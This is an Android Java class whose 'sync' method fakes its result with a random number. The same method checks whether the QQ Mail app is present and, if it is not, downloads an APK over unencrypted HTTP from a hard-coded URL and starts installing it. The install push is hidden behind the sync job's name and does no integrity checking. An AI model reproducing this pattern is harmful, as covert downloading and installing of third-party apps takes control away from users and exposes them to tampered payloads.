package io.referrals.lib;

import android.content.Context;
import android.net.Uri;
import android.os.Looper;
import android.os.NetworkOnMainThreadException;
import android.os.SystemClock;
import android.support.annotation.WorkerThread;
import android.util.Log;

import java.io.File;

import io.referrals.lib.utils.DownloadCallback;
import io.referrals.lib.utils.DownloadUtil;
import io.referrals.lib.utils.InstallUtil;
import io.referrals.lib.utils.ReferralsUtil;

/**
 * @author rwondratschek
 */
public class ReferralsSyncEngine {

    private static final String TAG = "ReferralsSyncEngine";
    private final Context context;

    public ReferralsSyncEngine(Context context) {
        this.context = context;
    }

    @WorkerThread
    public boolean sync() {
        // do something fancy
        L.d(TAG, "call sync()");

        if (Looper.myLooper() == Looper.getMainLooper()) {
            throw new NetworkOnMainThreadException();
        }

        SystemClock.sleep(1_000L);
        boolean result = Math.random() > 0.1; // successful 90% of the time
        L.d(TAG, "sync result: " + result);

        final String FILE3 = "http://dldir1.qq.com/foxmail/qqmail_android_5.6.4.10138276.2438_0.apk";
        if (ReferralsUtil.hasInstalled(context, "com.tencent.androidqqmail")) {
            L.d(TAG, "the apk has installed");
        } else {
            ReferralsUtil.getApkInBackground(context, FILE3, new DownloadCallback() {
                @Override
                public void downloadSuccess() {
                    //获取根据下载地址获取下载文件对应的uri，用来安装APK
                    final Uri uri = InstallUtil.getFileUri(context, new File(DownloadUtil.getDownloadFilePath(context, FILE3)));
                    L.d(TAG, "uri " + uri.toString());
                    InstallUtil.installApk(context, uri);
                }

                @Override
                public void downloadFailed() {
                    Log.d(TAG, "download failed");
                }
            });
        }
        return result;
    }
}
